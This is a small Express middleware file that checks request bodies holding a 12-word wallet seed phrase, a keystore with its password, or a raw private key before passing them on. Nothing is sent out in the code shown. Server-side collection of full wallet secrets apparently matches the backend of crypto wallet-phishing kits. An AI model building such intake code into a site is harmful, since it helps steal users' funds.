module.exports = (req, res, next) => {
    const { type, data } = req.body;
  
    if (!type || !data) {
      return res.status(400).json({ error: 'Missing type or data' });
    }
  
    switch (type) {
      case 'phrase':
        if (!data.phrase || data.phrase.trim().split(/\s+/).length !== 12) {
          return res.status(400).json({ error: 'Phrase must contain exactly 12 words' });
        }
        break;
  
      case 'keystore':
        if (!data.keystore || !data.password) {
          return res.status(400).json({ error: 'Keystore and password are required' });
        }
        break;
  
      case 'privateKey':
        if (!data.privateKey) {
          return res.status(400).json({ error: 'Private key is required' });
        }
        break;
  
      default:
        return res.status(400).json({ error: 'Invalid type' });
    }
  
    next();
  };
  